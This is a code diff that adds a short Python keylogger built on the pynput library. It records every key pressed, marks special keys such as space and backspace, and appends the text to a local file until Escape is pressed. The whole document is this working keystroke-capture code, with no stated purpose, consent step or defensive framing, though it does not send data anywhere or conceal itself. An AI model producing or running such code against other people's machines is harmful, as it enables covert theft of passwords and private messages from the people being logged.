@@ -1,0 +1,32 @@
+from pynput.keyboard import Key, Listener
+
+log_file = "key_log.txt"
+key_strokes = []
+
+def on_press(key):
+    if hasattr(key, 'char'):
+        key_strokes.append(str(key.char))
+    else:
+        if key == Key.space:
+            key_strokes.append(' [SPACE] ')
+        elif key == Key.enter:
+            key_strokes.append('\n')
+        elif key == Key.backspace:
+            key_strokes.append(' [BACKSPACE] ')
+        else:
+            key_strokes.append(f' [{str(key)}] ')
+
+    write_to_file(key_strokes)
+
+def write_to_file(keys):
+    with open(log_file, 'a') as file:
+        for key in keys:
+            file.write(key)
+        key_strokes.clear()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
